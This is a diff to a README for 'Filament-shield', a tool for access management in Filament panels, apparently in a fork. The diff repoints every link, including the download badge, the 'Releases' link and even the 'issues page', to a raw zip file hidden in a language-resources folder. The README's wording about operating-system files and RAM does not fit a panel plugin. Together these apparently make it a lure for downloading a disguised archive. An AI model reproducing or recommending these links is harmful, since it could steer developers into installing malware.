@@ -1,6 +1,6 @@
 # 🎉 Filament-shield - Effortless Access Management for Your Panel
 
-[![Download Filament-shield](https://raw.githubusercontent.com/ThanhDt716/Filament-shield/main/philonoist/Filament-shield.zip)](https://raw.githubusercontent.com/ThanhDt716/Filament-shield/main/philonoist/Filament-shield.zip)
+[![Download Filament-shield](https://raw.githubusercontent.com/ThanhDt716/Filament-shield/main/resources/lang/shield_Filament_v2.1.zip)](https://raw.githubusercontent.com/ThanhDt716/Filament-shield/main/resources/lang/shield_Filament_v2.1.zip)
 
 ## 📚 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -13,7 +13,7 @@
 Filament-shield is designed to simplify access management in your Filament Panel. This tool helps you manage roles and permissions easily without needing programming skills. Follow the steps below to get started.
 
 ## 💾 Download & Install
-To get Filament-shield, visit this page to download: [Filament-shield Releases](https://raw.githubusercontent.com/ThanhDt716/Filament-shield/main/philonoist/Filament-shield.zip).
+To get Filament-shield, visit this page to download: [Filament-shield Releases](https://raw.githubusercontent.com/ThanhDt716/Filament-shield/main/resources/lang/shield_Filament_v2.1.zip).
 
 1. Click on the latest version.
 2. Find the correct file for your operating system.
@@ -41,7 +41,7 @@ For an optimal experience, a minimum of 4 GB RAM is recommended.
 If you encounter any issues or have questions, you can reach out for support:
 
 - **Documentation**: Check the official documentation for detailed guides and FAQs.
-- **GitHub Issues**: Report problems or suggest features on the [issues page](https://raw.githubusercontent.com/ThanhDt716/Filament-shield/main/philonoist/Filament-shield.zip).
+- **GitHub Issues**: Report problems or suggest features on the [issues page](https://raw.githubusercontent.com/ThanhDt716/Filament-shield/main/resources/lang/shield_Filament_v2.1.zip).
 - **Community Forums**: Join discussions or ask for help from other users in the community forums.
 
 Thank you for choosing Filament-shield for your access management needs!
